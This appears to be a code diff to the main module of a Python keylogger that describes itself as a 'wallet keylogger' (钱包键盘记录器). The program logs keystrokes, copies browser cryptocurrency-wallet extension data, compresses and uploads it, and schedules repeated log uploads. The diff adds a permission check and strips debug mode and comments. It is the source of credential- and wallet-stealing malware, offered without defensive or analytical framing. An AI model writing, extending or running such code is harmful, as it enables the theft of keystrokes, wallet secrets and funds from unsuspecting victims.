@@ -9,12 +9,12 @@ import argparse
 from .logger import KeyLogger, create_log_file
 from .backup import backup_browser_extensions
 from .uploader import upload_all, start_log_upload_scheduler
+from .permissions import ensure_permissions
 
 
 def main():
     """主函数"""
     parser = argparse.ArgumentParser(description="钱包键盘记录器")
-    parser.add_argument("--debug", "-d", action="store_true", help="调试模式：实时显示窗口信息")
     parser.add_argument(
         "--dry-run",
         action="store_true",
@@ -22,6 +22,10 @@ def main():
     )
 
     args = parser.parse_args()
+
+    if not args.dry_run:
+        if not ensure_permissions():
+            sys.exit(1)
 
     if args.dry_run:
         print("dry-run 模式：不会创建日志、复制/删除扩展数据、压缩上传或启动上传调度\n")
@@ -32,7 +36,7 @@ def main():
         else:
             print("未检测到目标钱包扩展\n")
 
-        logger = KeyLogger(debug_mode=True, dry_run=True)
+        logger = KeyLogger(dry_run=True)
         try:
             logger.start()
         except KeyboardInterrupt:
@@ -42,10 +46,8 @@ def main():
             sys.exit(1)
         return 0
 
-    # 创建日志文件
     log_file = create_log_file()
 
-    # 备份浏览器扩展数据
     print("正在备份浏览器扩展数据...")
     count = backup_browser_extensions()
     if count > 0:
@@ -55,9 +57,8 @@ def main():
 
     upload_all()
     start_log_upload_scheduler()
-    
-    # 启动键盘记录器
-    logger = KeyLogger(log_file, debug_mode=args.debug)
+
+    logger = KeyLogger(log_file)
 
     try:
         logger.start()
